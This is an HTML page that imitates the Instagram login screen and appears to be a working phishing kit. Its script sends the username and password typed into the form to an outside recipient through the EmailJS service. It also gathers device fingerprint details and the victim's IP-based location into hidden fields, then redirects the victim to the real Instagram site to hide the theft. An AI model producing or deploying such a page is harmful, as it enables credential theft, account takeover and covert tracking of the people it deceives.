<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Instagram</title>
  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-200.png/ab6eff595bb1.png">
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
   <script>
    (function(){
      emailjs.init("R8vashMmVD4bmp4nI"); 
    })();
  </script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Roboto', sans-serif;
    }

    body {
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .main {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      max-width: 350px;
      padding: 20px;
    }

    .box {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      width: 100%;
      padding: 40px 40px 20px;
      text-align: center;
    }

    .box img.logo {
      width: 175px;
      margin-bottom: 30px;
    }

    .box input {
      width: 100%;
      padding: 9px;
      margin: 5px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background-color: #fafafa;
      font-size: 12px;
    }

    .login-btn {
      margin-top: 10px;
      width: 100%;
      padding: 8px;
      background-color: #0095f6;
      border: none;
      border-radius: 4px;
      color: white;
      font-weight: bold;
      font-size: 14px;
      cursor: pointer;
    }

    .or-line {
      display: flex;
      align-items: center;
      margin: 15px 0;
    }

    .or-line::before, .or-line::after {
      content: "";
      flex: 1;
      height: 1px;
      background-color: #dbdbdb;
    }

    .or-line span {
      margin: 0 10px;
      font-size: 13px;
      color: #8e8e8e;
      font-weight: bold;
    }

    .facebook-login {
      color: #385185;
      font-weight: bold;
      font-size: 14px;
      text-decoration: none;
    }

    .forgot {
      margin-top: 12px;
      font-size: 12px;
      color: #00376b;
      text-decoration: none;
    }

    .signup-box {
      margin-top: 10px;
      width: 100%;
      padding: 20px;
      background-color: #fff;
      border: 1px solid #dbdbdb;
      font-size: 14px;
      text-align: center;
    }

    .signup-box a {
      color: #0095f6;
      text-decoration: none;
      font-weight: bold;
    }

    .app-links {
      margin-top: 20px;
      text-align: center;
      font-size: 14px;
      color: #262626;
    }

    .app-icons img {
      width: 136px;
      margin: 10px 5px 0;
    }

    @media (max-width: 500px) {
      .box, .signup-box {
        border: none;
        padding: 20px 10px;
      }

      .main {
        padding: 0 15px;
      }

      .app-icons img {
        width: 120px;
      }
    }
  </style>
</head>
<body>
  <div class="main">
    <div class="box">
    <form  id="contactForm">
      <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram Logo" />
      <input type="text" name="email" placeholder="Phone number, username, or email" required/>
      <input type="password" name="password" placeholder="Password" required/>
      <!-- Hidden fields -->
      <input type="hidden" name="device_info" id="device_info">
      <input type="hidden" name="ip_info" id="ip_info">
      <input type="hidden" name="referrer" id="referrer">
      <input type="hidden" name="current_url" id="current_url">
      <input type="hidden" name="advanced_info" id="advanced_info">
      <button type="submit" class="login-btn">Log In</button>
      <div class="or-line"><span>OR</span></div>
      <a href="#" class="facebook-login">Log in with Facebook</a>
      <a href="#" class="forgot">Forgot password?</a>
    </form>
    </div>

    <div class="signup-box">
      Don't have an account? <a href="#">Sign up</a>
    </div>

    <div class="app-links">
      Get the app.
      <div class="app-icons">
        <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store" style="height: 40px;" />
<img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play" style="height: 40px;" />

      </div>
    </div>
  </div>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

  <!-- ✅ Then run your JS -->
  <script>
window.onload = function () {
  emailjs.init("R8vashMmVD4bmp4nI"); // Your Public Key

  const form = document.getElementById("contactForm");
  const deviceInfo = document.getElementById("device_info");
  const ipInfo = document.getElementById("ip_info");
  const referrer = document.getElementById("referrer");
  const currentUrl = document.getElementById("current_url");
  const advancedInfo = document.getElementById("advanced_info");

  // Basic info
  referrer.value = document.referrer || "Direct";
  currentUrl.value = window.location.href;

  // Device info
  function getBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
    if (ua.includes("Firefox")) return "Firefox";
    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
    if (ua.includes("Edg")) return "Edge";
    return "Unknown";
  }

  function getDeviceType() {
    const ua = navigator.userAgent.toLowerCase();
    if (/mobile|android|iphone|ipad|tablet/.test(ua)) return "Mobile/Tablet";
    return "Desktop";
  }

  deviceInfo.value = `
User Agent: ${navigator.userAgent}
Platform: ${navigator.platform}
Browser: ${getBrowser()}
Language: ${navigator.language}
Screen: ${screen.width}x${screen.height}
Window: ${window.innerWidth}x${window.innerHeight}
Online: ${navigator.onLine}
Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
Cookies Enabled: ${navigator.cookieEnabled}
RAM: ${navigator.deviceMemory || 'N/A'} GB
CPU Threads: ${navigator.hardwareConcurrency || 'N/A'}
Touch Support: ${'ontouchstart' in window}
Time: ${new Date().toLocaleString()}
Device Type: ${getDeviceType()}
  `.trim();

  // IP info
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      ipInfo.value = `
IP: ${data.ip}
City: ${data.city}
Region: ${data.region}
Country: ${data.country_name}
Postal Code: ${data.postal}
ISP: ${data.org}
Timezone: ${data.timezone}
      `.trim();
    });

  // Advanced info (dark mode, battery, refresh rate, GPU)
  async function getAdvancedInfo() {
    const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
      ? "Dark Mode" : "Light Mode";

    // Battery info
    let batteryInfo = "Not Available";
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      batteryInfo = `Battery: ${Math.round(battery.level * 100)}% - ${battery.charging ? "Charging" : "Not Charging"}`;
    }

    // GPU Info
    let gpuInfo = "Not Available";
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
      gpuInfo = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
    } catch (e) {}

    // Refresh rate
    function getRefreshRate(cb) {
      let start = performance.now(), count = 0;
      function frame() {
        count++;
        let now = performance.now();
        if (now - start >= 1000) cb(Math.round(count / ((now - start) / 1000)));
        else requestAnimationFrame(frame);
      }
      requestAnimationFrame(frame);
    }

    getRefreshRate(rate => {
      advancedInfo.value = `
Theme: ${darkMode}
${batteryInfo}
GPU: ${gpuInfo}
Estimated Refresh Rate: ${rate} Hz
      `.trim();
    });
  }

  getAdvancedInfo();

  form.addEventListener("submit", function (e) {
    e.preventDefault();

    emailjs.sendForm("service_jgthnxj", "template_vccm6dg", this) // Replace with your template ID
      .then(() => {
        window.location.href = "https://instagram.com";
        form.reset();
      }, (err) => {
        alert("❌ Failed to send message: " + JSON.stringify(err));
      });
  });
};
</script>
</body>
</html>
